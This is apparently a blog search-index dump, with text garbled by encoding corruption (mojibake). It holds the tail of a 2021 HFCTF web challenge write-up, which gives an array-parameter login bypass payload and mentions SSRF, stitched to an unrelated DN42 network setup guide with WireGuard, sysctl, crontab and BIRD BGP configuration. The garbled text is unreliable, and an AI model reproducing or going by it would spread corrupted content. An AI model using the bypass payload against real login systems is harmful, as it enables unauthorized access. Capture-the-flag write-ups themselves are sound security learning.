ä»¥åŠ Node.jsä¸­url.parseå‡½æ•°çš„æ½œåœ¨å®‰å…¨é—®é¢˜ JavaScript åœ¨ä½¿ç”¨åŠ å·æ‹¼æ¥çš„æ—¶å€™æœ€ç»ˆä¼šå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²(string)ï¼Œäºæ˜¯ä¸ä¼šå½±å“ sha256 çš„å¤„ç†ã€‚ è¿™é‡Œæ˜¯ç”¨ GET query ä¼ å‚ï¼Œå¯ä»¥æ„é€  payload username[]=admin&amp;password=admin å°±èƒ½æˆåŠŸä»¥ç®¡ç†å‘˜èº«ä»½è¿›å…¥ã€‚ æ¥ä¸‹æ¥æ‰“ ssrfâ€¦â€¦ ï¼ˆé¢˜ç›®ç¯å¢ƒå…³äº†å¤ç°ä¸äº†äº†å•Šå˜¤å˜¤å˜¤ ï¼ˆåé¢å†æ­ç¯å¢ƒå¤ç°å§ èµµæ€»çš„ buuoj å¼€äº†ç¯å¢ƒğŸ‘‡ ç¯å¢ƒï¼š [è™ç¬¦CTF 2021] Internal System è¿™é¢˜å¤ªé¡¶äº†ï¼ ä¸“é—¨å†™äº†ä¸€ç¯‡å¤ç°è¿™é¢˜çš„åšå®¢ï¼Œç§»æ­¥ä¸‹é¢è¿™ç¯‡å§ã€‚ CTF | 2021 è™ç¬¦CTF Web internal_system å¤ç° å°ç»“å°±åšå‡ºäº†ä¸¤é¢˜ webï¼Œå–µå–µå¥½èœå•Šæ˜¯ fwï¼Œå–µå‘œå‘œå‘œï¼ˆ ä¸è¿‡æœ‰ç‚¹ä½›ç³»ï¼Œå°±ä¸‹åˆçœ‹äº†ä¸€ä¸‹ï¼Œå¿«åˆ°æ™šä¸Šå°±å‡ºå»ç©äº†ï¼ˆå…¶å®æ²¡è®¤çœŸæ‰“ï¼Œè¿™å°±é€ƒèµ° ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/04/04/CTF_2021HFCTF/"},{"title":"DN42 | å…¥å‘ DN42 å®éªŒç½‘ç»œ","text":"0x00 å‰è¨€å…¶å®æƒ³ç© DN42 ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œæ­£å¥½æœ€è¿‘ç¾¤å‹ä¹Ÿåœ¨èŠ DN42ï¼ŒåŠ¨ä¸åŠ¨å°±ã€Œæ¥ Peerï¼ã€ã€‚ é‚£å’±å°±æ¥æ•´ä¸€ä¸ªå¥½äº†ï¼ è¯·æ³¨æ„ï¼Œæœ¬æ–‡ä¸æ˜¯ä¸€ç¯‡å®Œæ•´çš„ä»‹ç»æ€§æ–‡ç« ï¼Œåªæ˜¯è®°å½•ä¸€ä¸‹é…ç½®è¿‡ç¨‹ä¸­é‡åˆ°çš„å‘å•Šä»€ä¹ˆçš„ã€‚ 0x01 What is DN42? dn42 is a big dynamic VPN, which employs Internet technologies (BGP, whois database, DNS, etc). Participants connect to each other using network tunnels (GRE, OpenVPN, Tinc, IPsec) and exchange routes thanks to the Border Gateway Protocol. Network addresses are assigned in the 172.20.0.0/14 range and private AS numbers are used (see registry) as well as IPv6 addresses from the ULA-Range (fd00::/8) - see FAQ. A number of services are provided on the network: see internal (only available from within dn42). Also, dn42 is interconnected with other networks, such as ChaosVPN or some Freifunk networks. Via Official Wiki DN42 å…¨ç§° Decentralized Network 42ï¼ˆ42 å·å»ä¸­å¿ƒç½‘ç»œï¼‰ï¼Œæ˜¯ä¸€ä¸ªå¤§å‹ã€å»ä¸­å¿ƒåŒ–çš„ VPN ç½‘ç»œã€‚ä½†æ˜¯ä¸å…¶å®ƒä¼ ç»Ÿ VPN ä¸åŒçš„æ˜¯ï¼ŒDN42 æœ¬èº«ä¸æä¾› VPN å‡ºå£æœåŠ¡ï¼Œå³ä¸æä¾›è§„é¿ç½‘ç»œå®¡æŸ¥ã€æµåª’ä½“è§£é”ç­‰ç±»ä¼¼æœåŠ¡ã€‚ç›¸åï¼ŒDN42 çš„ç›®çš„æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªäº’è”ç½‘ã€‚å®ƒä½¿ç”¨äº†å¤§é‡åœ¨ç›®å‰äº’è”ç½‘éª¨å¹²ä¸Šåº”ç”¨çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚ BGP å’Œé€’å½’ DNSï¼‰ï¼Œå¯ä»¥å¾ˆå¥½åœ°æ¨¡æ‹Ÿä¸€ä¸ªçœŸå®çš„ç½‘ç»œç¯å¢ƒã€‚ ç®€è€Œè¨€ä¹‹ï¼ŒDN42ï¼š ä¸é€‚åˆå•çº¯æƒ³è¦ä¿æŠ¤éšç§ã€è§„é¿ç½‘ç»œå®¡æŸ¥çš„ç”¨æˆ· ä¸é€‚åˆåœ¨ç½‘å†…æ¶ˆè€—å¤§é‡æµé‡ï¼Œä¾‹å¦‚ç”¨äºè§£é”æµåª’ä½“æœåŠ¡çš„ç”¨æˆ· é€‚åˆæƒ³è¦ç ”ç©¶ç½‘ç»œæŠ€æœ¯ï¼Œç»ƒä¹ æœåŠ¡å™¨ã€è·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡é…ç½®ï¼Œç”šè‡³åç»­åœ¨çœŸå®äº’è”ç½‘å»ºç«‹ AS çš„ç”¨æˆ· é€‚åˆæ‹¥æœ‰çœŸå® ASï¼Œä½†æ‹…å¿ƒè‡ªå·±é…ç½®é”™è¯¯å¹¿æ’­å‡ºé”™è¯¯è·¯ç”±ã€å¹²æ‰åŠä¸ªäº’è”ç½‘ï¼Œå¸Œæœ›æœ‰ä¸ªåœ°æ–¹æµ‹è¯•çš„ç”¨æˆ·ã€‚ Via Lan Tianâ€™s Blog å…¶å®å°±æ˜¯è¯´ï¼ŒDN42 æ˜¯ä¸€ä¸ªå¤§å‹ VPN ç½‘ç»œï¼Œæ¨¡æ‹Ÿäº†ç°å®ç”Ÿæ´»ä¸­çš„çœŸå®äº’è”ç½‘ã€‚ ç›®å‰ DN42 å·²ç»ä¸ NeoNetworkã€ChaosVPN ç­‰ç½‘ç»œå®ç°äº†äº’è”ï¼ŒåŠ å…¥å°±èƒ½ä½“éªŒåˆ°å…¶ä»–ç½‘ç»œå†…çš„èµ„æºã€‚ é‚£ä¸ºä»€ä¹ˆè¦åŠ å…¥ DN42 å‘¢ï¼Ÿ å½“ç„¶æ˜¯å¥½ç©å•¦ w ä½ æƒ³æƒ³ï¼Œåªéœ€è¦åŠ¨åŠ¨æ‰‹åŠ¨åŠ¨è„‘ï¼Œå°±èƒ½å…è´¹æ‹¥æœ‰å±äºè‡ªå·±çš„ ASN (Autonomous system numberï¼Œè‡ªæ²»ç³»ç»Ÿç¼–å·)ï¼Œèƒ½å®£å‘Šä¸€æ®µ IPv4 å’Œ IPv6ï¼Œä½“éªŒå„ç§è·¯ç”±åè®®ï¼Œè¿˜èƒ½å’Œåˆ«äººå°½æƒ…åœ° py Peerï¼ˆå¯¹æ¥ï¼‰ã€‚ è¿™å¯æ¯”æ™®é€šçš„è®¡ç®—æœºç½‘ç»œå®éªŒå¥½ç©å¤šäº†ï¼ å½“ç„¶ï¼Œä¸ºäº†æŠ˜è…¾ DN42ï¼Œä½ è‡³å°‘éœ€è¦ä¸€å°èƒ½ä¸é—´æ–­è”ç½‘çš„è®¾å¤‡ä»¥åŠå¯¹å®ƒçš„ root æƒé™ï¼Œå½“ç„¶è¿˜éœ€è¦èŠ±ä¸å°‘æ—¶é—´â€¦â€¦ï¼ˆå–µå–µå¥½èœå•Šï¼Œåˆ«éª‚äº†åˆ«éª‚äº† 0x02 å¤§æ¦‚çš„æ­¥éª¤TL;DR åœ¨ Git ä»“åº“ç”³è¯·è´¦å·ï¼Œç”³è¯·å¥½ä½ éœ€è¦çš„ ASNï¼ŒIP æ®µï¼ˆï¼ŒåŸŸåä»¥åŠåå‘è§£ææœåŠ¡å™¨ï¼‰ï¼Œç„¶åç»™ä»“åº“æPR å¯»æ‰¾ä¸€ä¸ªå¯èƒ½çš„ Peer èŠ‚ç‚¹ï¼ŒæŒ‰ç…§ä»–ç•™ä¸‹çš„è”ç³»æ–¹å¼ç»™ä»–å‘é‚®ä»¶/IRC/Telegram/etc. å¯»æ‰¾ä¸€ä¸ªå»¶è¿Ÿè¾ƒä½çš„èŠ‚ç‚¹ï¼Œå¹¶å’Œä»–çº¦å®šå¥½ä½¿ç”¨çš„ VPN è½¯ä»¶å’Œè·¯ç”±åè®® å»ºç«‹ VPN é€šä¿¡éš§é“ï¼Œç¡®ä¿èƒ½äº’ç›¸è¿é€š å»ºç«‹è·¯ç”±ï¼ˆä¸€èˆ¬æ˜¯ BGPï¼‰ 0x03 æ³¨å†Œè¿‡ç¨‹è¿™éƒ¨åˆ†ä¸»è¦å‚è€ƒ Lan Tian å¸ˆç¥–çš„ DN42 å®éªŒç½‘ç»œä»‹ç»åŠæ³¨å†Œæ•™ç¨‹ï¼ˆ2020-10-01 æ›´æ–°ï¼‰ ä¸€æ–‡è¿›è¡Œã€‚ ç›®å‰ DN42 é‡‡ç”¨ git ä»“åº“è¿›è¡Œç®¡ç†ï¼Œå¯ä»¥å‚è€ƒ DN42 å®˜æ–¹ Wiki howto/Getting Started æ¥è¿›è¡Œé…ç½®ã€‚ ä¹Ÿå¯ä»¥å‚è€ƒ å–µå–µçš„ PRï¼Œå–µ~ ï¼ˆéœ€è¦ç™»å½• gitï¼‰ ä¸ºäº†æ‰¾ç©ºå‡ºæ¥è€Œä¸”å¥½çœ‹çš„ ASNï¼Œå–µå–µè¿˜ä¸“é—¨å†™äº†ä¸ªè„šæœ¬â€¦â€¦ å…·ä½“å°±ä¸è¯´äº†ï¼Œä½†åæ§½å‡ å¥ã€‚ è¿™é‡Œæœ‰å‡ ä¸ªå‘å°±æ˜¯ï¼Œéœ€è¦ç”¨ Linux ç³»ç»Ÿæ¥è¿›è¡Œé…ç½®ï¼Œä¸€å®šä¸è¦ç”¨ Windows ç³»ç»Ÿï¼Œå› ä¸º win çš„æ–‡ä»¶ç³»ç»Ÿä¸æ”¯æŒå¸¦æœ‰ : çš„æ–‡ä»¶åï¼Œäºæ˜¯ git ä»“åº“éƒ½æ‹‰ä¸ä¸‹æ¥ã€‚ å¦‚æœæƒ³è¦ç”¨ win çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ WSL2ã€‚ å¦å¤–å°±æ˜¯ï¼Œæ‰¾ IP æ®µå¾ˆå®¹æ˜“ç¢°åˆ°å†²çªï¼Œè€Œä¸”è‡ªå·±ä¸å®¹æ˜“å‘ç°â€¦â€¦ã€ æ¯”å¦‚ä¹‹å‰æ‰¾äº†ä¸€æ®µå‘ç°è¢«äººå äº†å¥½å¤§ä¸€å—ï¼Œåˆæˆ–è€…æ•´ä¸ª /18 ä¿ç•™ç»™ /24 - /21 äº†ï¼Œäººå‚»äº†ã€‚ å†æ¯”å¦‚ä¹‹å‰ç”³è¯·çš„ä¸€ä¸ªæ®µå‘ç°è¢« DN42 å®˜æ–¹ä¿ç•™äº†ã€‚ INFO: 172.22.222.0/26 (inetnum): Inetnum has different mntners than parent and policy of parent is reserved: [MIAOTONY-MNT] vs [DN42-MNT]. æ‰¾äº†åŠå¤©æ‰å‘ç°æ˜¯æœ‰ä¸ª 172.22.192.0/18ï¼Œç›´æ¥å¥½å®¶ä¼™ã€‚ å½“ç„¶ï¼Œå¦‚æœæœ‰å¤šä¸ª commit è®°å½•ï¼Œè®°å¾—å…ˆ squash ä¸€ä¸‹å† pushï¼Œå¯ä»¥ç›´æ¥ç”¨ç›®å½•ä¸‹è‡ªå¸¦çš„è„šæœ¬æ¥ pushã€‚ ä¸è¿‡å…¶å®ä¹Ÿæ²¡å•¥å…³ç³»ï¼ŒPR ä¸Šå»ä¹‹åæœ‰ CI è‡ªåŠ¨è¿›è¡Œæ£€æµ‹ï¼ŒæŒ‰ç…§è¦æ±‚æ›´æ”¹å°±å®Œäº‹äº†ã€‚ 0x04 é¦–å…ˆè¦è¿›è¡Œçš„ç³»ç»Ÿé…ç½®åœ¨æ¯ä¸€å°è¦åŠ å…¥ DN42 çš„èŠ‚ç‚¹éƒ½éœ€è¦è¿›è¡Œä»¥ä¸‹é…ç½®ï¼ æ‰“å¼€ Linux å†…æ ¸çš„æ•°æ®åŒ…è½¬å‘åŠŸèƒ½ï¼Œå³ ip_forwardingã€‚ å…³é—­ Linux å†…æ ¸ rp_filter çš„ä¸¥æ ¼æ¨¡å¼ã€‚ å…³æ‰ ufw ç­‰å¸®åŠ©é…ç½® iptables é˜²ç«å¢™çš„å·¥å…·ã€‚ï¼ˆå¦‚æœ‰éœ€è¦ï¼Œæ‰‹åŠ¨é…ç½® iptables å‰ä¸¤æ¡è®¾ç½®æ­¥éª¤å¦‚ä¸‹ã€‚ vim /etc/sysctl.conf æ–°å¢ä»¥ä¸‹å‡ æ¡é…ç½® net.ipv4.ip_forward=1 net.ipv6.conf.default.forwarding=1 net.ipv6.conf.all.forwarding=1 net.ipv4.conf.default.rp_filter=0 net.ipv4.conf.all.rp_filter=0 ç„¶ååº”ç”¨é…ç½® sysctl -p 20220423 Update: rp_filter ç”± 2 æ”¹ä¸º 0. ä¸»è¦æ˜¯å› ä¸ºåœ¨æŸæ¬¡æµ‹è¯•ä¸­å‘ç°å‡ºäº†ç‚¹é”…ï¼Œå›å»çœ‹äº†è“å¤©çš„åšå®¢ï¼Œå‘ç°æ›´æ–°äº†â€¦â€¦ ä½†æ˜¯ç†è®ºå½’ç†è®ºï¼Œåœ¨æ–°ç‰ˆæœ¬ï¼ˆ5.0+ï¼‰çš„å†…æ ¸ä¸­ï¼Œå®é™…ä½¿ç”¨ä¸­ä¾ç„¶ä¼šæœ‰å¤§é‡æ¥æºåœ°å€æ­£ç¡®çš„æ­£å¸¸æ•°æ®åŒ…è¢«ä¸¢å¼ƒã€‚å› æ­¤ä¸è¦ä½¿ç”¨è¿™ä¸ªæ¨¡å¼ï¼Œè¯·ç»Ÿä¸€ä½¿ç”¨ 0ã€‚ å¥½å§ã€‚ 0x05 å»ºç«‹é€šä¿¡éš§é“DN42 æ˜¯åŸºäº VPN æ¥å»ºç«‹é€šä¿¡è¿æ¥çš„ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå¤§å¤šæ•°ç”¨æˆ·éƒ½ä½¿ç”¨ WireGuard æ¥è¿›è¡Œã€‚ WireGuard æ˜¯ L3 å±‚éš§é“ï¼Œç›®å‰å·²ç»é›†æˆåˆ°äº† Linux å†…æ ¸ä¸­ï¼Œå®ƒé…ç½®ç®€å•ï¼Œå ç”¨èµ„æºå°‘ï¼Œå®‰å…¨æ€§è¾ƒé«˜ã€‚ å¦‚æœä¸æ˜¯ OpenVZ æˆ–è€… LXC è™šæ‹ŸåŒ–çš„è¯ï¼Œå…¶ä»–åº”è¯¥éƒ½èƒ½ç”¨å§ï¼Œä¸æ”¯æŒçš„è¯å¯èƒ½éœ€è¦å‡çº§ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬ã€‚ è¿™é‡Œå¯ä»¥å‚è€ƒ å®˜æ–¹ Wiki çš„ howto/wireguard æ¥è¿›è¡Œã€‚ Wireguard is a Layer3 VPN. In theory it allows multiple peers to be served with one interface/port, but it does internal routing based on the peerâ€™s public key. This means you will need one interface per peering on dn42 to allow your BGP daemon instead to do routing. This approach is comparable to OpenVPN p2p tunnels. æ„æ€æ˜¯ wg å†…éƒ¨çš„è·¯ç”±æ˜¯åŸºäºå…¬é’¥æ¥è¿›è¡Œçš„ï¼Œäºæ˜¯å’Œä¸åŒçš„ç½‘ç»œè¿›è¡Œ peerï¼Œå¯¹äºæ¯ä¸ª peer éƒ½éœ€è¦å»ºç«‹ä¸€ä¸ªæ–°çš„æ¥å£ï¼Œä¹Ÿå°±ç›¸å½“äºå¤šä¸€ä¸ªè™šæ‹Ÿç½‘å¡ã€‚ä¸è¿‡è¿™ä¸ªæ¥å£çš„ IP å¯ä»¥éƒ½ä¸€æ ·ï¼Œä¸å—å½±å“ã€‚ é¦–å…ˆ ç”Ÿæˆä¸€å¯¹å…¬é’¥å’Œç§é’¥ wg genkey | tee privatekey | wg pubkey &gt; publickey ä¸åŒäº Lan Tian å¸ˆç¥–çš„ sh é…ç½®è„šæœ¬ï¼Œæ­¤å¤„å–µå–µ ç›´æ¥ä½¿ç”¨ wg-quick æ¥é…ç½®ã€‚ è¿™æ˜¯æˆ‘çš„é…ç½®æ¨¡æ¿ã€‚ä¸€èˆ¬æ˜¯æ”¾åœ¨ /etc/wireguard/xxx.conf. [Interface] PrivateKey = &lt;è‡ªå·±çš„ç§é’¥&gt; ListenPort = &lt;è‡ªå·±ç›‘å¬çš„ç«¯å£ï¼Œä¸€èˆ¬æ˜¯å¯¹æ–¹ASNåäº”ä½&gt; PostUp = ip addr add &lt;ä½ çš„DN42 IPv4&gt;/32 peer &lt;å¯¹æ–¹çš„DN42 IPv4&gt;/32 dev %i # å¦‚æœç”¨ IPv6 ULA # PostUp = ip addr add &lt;ä½ çš„DN42 IPv6&gt;/128 peer &lt;å¯¹æ–¹çš„DN42 IPv6&gt;/128 dev %i # å¦‚æœç”¨ link-localï¼ˆæ¨èï¼‰ PostUp = ip addr add &lt;link-local&gt;/64 dev %i Table = off [Peer] PublicKey = &lt;å¯¹æ–¹çš„å…¬é’¥&gt; Endpoint = &lt;å¯¹æ–¹çš„å…¬ç½‘åœ°å€&gt;:&lt;å¯¹æ–¹çš„ç«¯å£ï¼Œä¸€èˆ¬æ˜¯è‡ªå·±ASNåäº”ä½&gt; AllowedIPs = 0.0.0.0/0, ::/0 å¦‚æœ [Interface] é‡Œå†™äº† Address çš„è¯éœ€è¦åœ¨ PostUp é‡Œå…ˆåˆ æ‰ addr å†åŠ ä¸Š peerï¼Œæ‰€ä»¥å¹²è„†å°±ä¸é… Address äº†ã€‚ æ³¨æ„è¿™é‡Œ Table = off è¦åŠ ä¸Šï¼Œä¸ç„¶æ‰€æœ‰çš„æµé‡ï¼ŒåŒ…æ‹¬å…¬ç½‘ä¸Šçš„æµé‡å°±éƒ½è½¬å‘ç»™ä½ çš„ peer äº†ï¼Œè¿™æ ·å¯èƒ½ä½ å°±è¿è‡ªå·±çš„æœºå™¨éƒ½è¿ä¸ä¸Šäº†ã€‚ ç„¶åå–µå–µé…å®Œ wgï¼Œä¸€å¯åŠ¨ï¼ŒSSH è¿æ¥æ–­äº†ï¼Œå–µå–µæ„£ä½äº†ï¼ˆè¿˜å¥½æœåŠ¡å•†èƒ½èµ· VNCï¼Œç„¶åä¸Šå»æŠŠ wg è¿æ¥æ–­äº†æ‰é‡æ–°è¿ä¸Š SSHâ€¦ è¿™é‡Œä¸€èˆ¬æ¨èç”¨ link-local åœ°å€ è¿›è¡Œé…ç½®ï¼Œé™¤éåŒæ–¹çº¦å®šå¥½æ˜¯ç”¨ ULAã€‚ è¿™æ˜¯é“¾è·¯æœ¬åœ°åœ°å€ï¼Œ IPv6 å®šä¹‰åœ¨ fe80::/10 åœ°å€å—ã€‚ä¸€èˆ¬å°±æ˜¯ fe80::&lt;ä½ çš„ASNåå››ä½&gt;ã€‚ ç„¶åä¸ºäº†æ–¹ä¾¿ï¼Œå‚è€ƒ @moecast å¤§ä½¬çš„é…ç½®è„šæœ¬ï¼Œä¸€æ­¥é…ç½® serviceã€‚ $ cat /sbin/wgen #!/bin/bash filename=\"$(basename -- $1 .conf)\" systemctl enable wg-quick@$filename.service service wg-quick@$filename start è¿™ä¸ªè„šæœ¬å°†å¯åŠ¨éš§é“ï¼Œå¹¶æŠŠé…ç½®æ³¨å†Œåˆ° service ä¸­ï¼Œå®ç°å¼€æœºè‡ªå¯ã€‚ æŠŠè¿™ä¸ªè„šæœ¬æ”¾åˆ° /sbin/wgenï¼Œç„¶å chmod +x /sbin/wgen èµ‹äºˆæ‰§è¡Œæƒé™ã€‚ éœ€è¦ç”¨çš„æ—¶å€™ç›´æ¥ wgen æ–‡ä»¶å å°±è¡Œäº†ã€‚ æœ€åçœ‹çœ‹è¿æ¥å»ºç«‹äº†æ²¡æœ‰ã€‚ wg show æ–‡ä»¶å # æˆ–è€…ç›´æ¥ wg çœ‹åˆ° transfer é‡Œå‘é€æ¥æ”¶éƒ½æœ‰æ•°æ®äº†è¯´æ˜å°±èƒ½è¿ä¸Šäº†ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥ ping ä¸€ä¸‹å¯¹æ–¹ã€‚ WireGuard æ¥å£åå°±æ˜¯ä½ é…ç½®çš„æ–‡ä»¶åã€‚ # ping å¯¹æ–¹IP%WireGuardæ¥å£å ping fe80::xxxx%wg_424242xxxx å½“ç„¶äº†ï¼Œä¹Ÿå¯ä»¥æ‰‹å†™ systemd æ¥é… wgï¼Œå‚è€ƒ å®˜æ–¹ Wiki å°±å¥½äº†ã€‚ 0x06 å»ºç«‹ BGP ä¼šè¯BGP(Border Gateway Protocolï¼Œè¾¹ç•Œç½‘å…³åè®®) æ˜¯ä¸€ç§è·¯ç”±åè®®ï¼Œä¸€èˆ¬éƒ½ä½¿ç”¨è¿™ä¸ªæ¥è¿›è¡Œ peerã€‚ è·¯ç”±çš„è½¯ä»¶ä¸€èˆ¬ä½¿ç”¨çš„æ˜¯ BIRD Internet Routing Daemon (v2) ã€‚ æ­¤å¤„å‚è€ƒ DN42 Wiki ä¸Šçš„ Bird2 é…ç½®æ•™ç¨‹ DN42 Wiki ä¸Šçš„ Bird1 é…ç½®æ•™ç¨‹ bird.conf ä¸ ROAè¿™é‡Œè¦æ³¨æ„ ä¸€å®šæŒ‰ç…§æ•™ç¨‹å…ˆé…å¥½ /etc/bird/bird.confï¼Œæˆ–è€… /etc/bird.confï¼ æ­¤å¤„ä½¿ç”¨çš„æ˜¯ wiki ä¸Šçš„æ¨¡æ¿ï¼Œæ¯”å¦‚å–µå–µçš„ Variable header å¦‚ä¸‹ã€‚ OWNIP å’Œ OWNIPv6 æ˜¯ä½ æœ¬æœºè¦åˆ†é…çš„åœ°å€ï¼ŒOWNNETSET å’Œ OWNNETSETv6 ä¸ç”¨æ¼äº†ç»“å°¾çš„ +ã€‚ ################################################ # Variable header # ################################################ define OWNAS = 4242422688; define OWNIP = 172.23.6.6; define OWNIPv6 = fd00:feed:ca7::6; define OWNNET = 172.23.6.0/26; define OWNNETv6 = fd00:feed:ca7::/48; define OWNNETSET = [172.23.6.0/26+]; define OWNNETSETv6 = [fd00:feed:ca7::/48+]; ################################################ # Header end # ################################################ ç„¶åæŠŠ ROA (Route Origin Authorization) é…å¥½ã€‚ ä¸€èˆ¬è·¯å¾„åœ¨ /etc/bird/roa_dn42{,_v6}.conf å¯ä»¥å†™ä¸ª crontab å®šæœŸè‡ªåŠ¨ä¸‹è½½æ›´æ–°ã€‚æ³¨æ„ bird.conf é‡Œçš„ roa è·¯å¾„è¦é…çš„ä¸€è‡´ã€‚ # crontab -e */15 * * * * curl -sfSLR -o /etc/bird/roa_dn42.conf https://dn42.burble.com/roa/dn42_roa_bird2_4.conf &amp;&amp; curl -sfSLR -o /etc/bird/roa_dn42_v6.conf https://dn42.burble.com/roa/dn42_roa_bird2_6.conf &amp;&amp; /usr/sbin/birdc configure 1&gt; /dev/null å¯ä»¥å…ˆæ‰§è¡Œä¸€æ¬¡è®©æ–‡ä»¶å­˜åœ¨ï¼Œä¸ç„¶åé¢å¯åŠ¨ bird çš„æ—¶å€™å¯èƒ½ä¼šæœ‰é—®é¢˜ã€‚ Peers æ–‡ä»¶mkdir -p /etc/bird/peers æ¯ä¸€ä¸ª peer å»ºä¸€ä¸ªæ–‡ä»¶ /etc/bird/peers/&lt;NEIGHBOR_NAME&gt;.confã€‚ ä¸‹é¢æ˜¯ Lan Tian å¸ˆç¥–çš„æ¨¡æ¿ã€‚ protocol bgp dn42_[PEER_NAME]_v4 from dnpeers { neighbor [YOUR_DN42_IP] as [YOUR_ASN]; direct; # ä¸‹é¢è¿™æ®µæ˜¯åœ¨ IPv4 BGP ä¸­ç¦ç”¨ IPv6 è·¯ç”±ä¼ é€’ï¼Œå¼ºçƒˆæ¨èï¼›æŸ¥çœ‹ä¸‹æ–‡ä»¥å†³å®šä½ è¦ä¸è¦è¿™æ ·åšï¼ˆä¿ç•™ä¸‹é¢çš„å†…å®¹ï¼‰ ipv6 { import none; export none; }; }; protocol bgp dn42_[PEER_NAME]_v6 from dnpeers { neighbor [YOUR_LINK_LOCAL_IP] % 'dn42-[PEER_NAME]' as [YOUR_ASN]; direct; # ä¸‹é¢è¿™æ®µæ˜¯åœ¨ IPv6 BGP ä¸­ç¦ç”¨ IPv4 è·¯ç”±ä¼ é€’ï¼›æŸ¥çœ‹ä¸‹æ–‡ä»¥å†³å®šä½ è¦ä¸è¦è¿™æ ·åšï¼ˆä¿ç•™ä¸‹é¢çš„å†…å®¹ï¼‰ ipv4 { import none; export none; }; }; MY æŒ‡çš„æ˜¯ä½ è‡ªå·±ï¼Œè€Œ YOUR æŒ‡çš„æ˜¯ä½ å°†è¦ Peer çš„é‚£ä¸ªäººã€‚ BIRD ä¸­é…ç½®çš„æ˜¯ DN42 å†…çš„ IP è€Œéå…¬ç½‘ IPã€‚ ç›¸æ¯” DN42 Wiki ä¸Šçš„é…ç½®ï¼Œæˆ‘åŠ äº†ä¸€è¡Œ direct;ï¼ŒåŸå› æ˜¯æˆ‘å‘ç°å¦‚æœç¼ºå°‘è¿™è¡Œï¼Œè·¯ç”±ä¿¡æ¯æœ‰å¯èƒ½æ— æ³•è¢«æ­£ç¡®çš„å¯¼å…¥ç³»ç»Ÿè·¯ç”±è¡¨ã€‚ BIRD é»˜è®¤ä¼šæ ¹æ®ç³»ç»Ÿè·¯ç”±è¡¨æŸ¥æ‰¾è¦å°†æ•°æ®åŒ…è½¬å‘åˆ°å“ªä¸ªç½‘ç»œè®¾å¤‡ï¼Œä»¥æ­¤è®¾ç½®ç³»ç»Ÿè·¯ç”±è¡¨ï¼Œä½†æœ‰æ—¶æŸ¥æ‰¾ä¼šå¤±è´¥ï¼ˆè¡¨ç°ä¸º ip route ä¸­å‡ºç°å¤§ç‰‡ unreachableï¼‰ã€‚ æ­¤æ—¶æŒ‡å®š directï¼Œè®© BIRD å°†æ•°æ®åŒ…ç›´æ¥è½¬å‘åˆ° BGP è¿æ¥æ‰€åœ¨çš„ç½‘å¡ä¸Šã€‚ direct çš„å«ä¹‰æ˜¯è¿æ¥åŒæ–¹ç›´æ¥è¿æ¥ï¼ˆå³ä¸­é—´æ²¡æœ‰é—´éš”å…¶å®ƒçš„è·¯ç”±å™¨ï¼‰ã€‚ PEER_NAME æ˜¯å¯¹æ–¹çš„æ˜µç§°ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯ Linux ä¸‹çš„ç½‘ç»œè®¾å¤‡åï¼Œä¸éš§é“ä¿æŒä¸€è‡´ã€‚æ³¨æ„æ•´ä¸ªç½‘ç»œè®¾å¤‡åä¸èƒ½è¶…è¿‡ 15 ä¸ªå­—ç¬¦ï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­ã€‚ åœ¨ IPv6 Peering æ—¶ï¼Œæˆ‘æ¨èä½¿ç”¨ Link-local IPã€‚ ç›´æ¥ä½¿ç”¨å¯¹æ–¹æ•´ä¸ªèŠ‚ç‚¹çš„ IPv6 åœ°å€ï¼ˆæŒ‡ fd00::/8 èŒƒå›´ä¸­çš„é‚£ä¸ªï¼‰æ—¶ï¼Œéƒ¨åˆ†ç³»ç»Ÿä¸ä¼šè‡ªåŠ¨æ·»åŠ åˆ°å¯¹ç«¯çš„è·¯ç”±ï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€æ¡ï¼›è§ éš§é“æ­å»ºï¼šWireGuard ä¸€èŠ‚ã€‚ åœ¨ BIRDv2 ä¸­ï¼Œå¼ºçƒˆæ¨èåœ¨ IPv4 BGP ä¼šè¯ä¸­ç¦ç”¨ IPv6 çš„è·¯ç”±ä¼ é€’ï¼ŒåŒæ—¶å¯ä»¥åœ¨ IPv6 BGP ä¸­ç¦ç”¨ IPv4 è·¯ç”±ä¼ é€’ã€‚ BIRDv2 æ”¯æŒåœ¨ä¸€ä¸ª BGP ä¼šè¯ä¸­åŒæ—¶ä¼ é€’ IPv4 å’Œ IPv6 çš„è·¯ç”±ã€‚ åœ¨ IPv4 BGP ä¼šè¯ä¸­ï¼ŒBIRDv2 éš¾ä»¥æ­£ç¡®åˆ¤æ–­ IPv6 æ•°æ®åŒ…è½¬å‘ç›®æ ‡çš„åœ°å€ï¼ˆNext Hopï¼‰ï¼Œä¼šå¯¼è‡´ ip -6 route ä¸­å‡ºç°å¤§ç‰‡ unreachableã€‚ å› æ­¤ç›´æ¥ç¦ç”¨å°±å¥½äº†ã€‚ åœ¨ IPv6 BGP ä¼šè¯ä¸­ä¼ é€’ IPv4 è·¯ç”±æ—¶ï¼Œå¦‚æœåŒæ–¹ä½¿ç”¨ç‰¹å®šçš„ BGP è½¯ä»¶ç»„åˆï¼Œä¸€æ–¹æˆ–åŒæ–¹çš„æ—¥å¿—ä¸­ä¼šå‡ºç°å¤§ç‰‡ Invalid NEXT_HOP Attributeï¼ŒæŒ‡ Next Hop åˆ¤æ–­å‡ºé”™ã€‚ ä½† IPv6 BGP ä¸­åŒæ—¶ä¼ é€’ IPv4 å’Œ IPv6 è·¯ç”±çš„åº”ç”¨è¿˜æ¯”è¾ƒå¹¿æ³›ï¼Œå› æ­¤ä¸€èˆ¬å»ºè®®ä¸è¦ç¦ç”¨ IPv4 è·¯ç”±ä¼ é€’ï¼Œé™¤éå‡ºç°äº†é—®é¢˜ã€‚ BIRD2 æ˜¯æ”¯æŒ Multiprotocol BGP çš„ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥åœ¨å•ç‹¬ä¸€ä¸ª IPv4/IPv6 BGP session é‡Œå»ºç«‹ 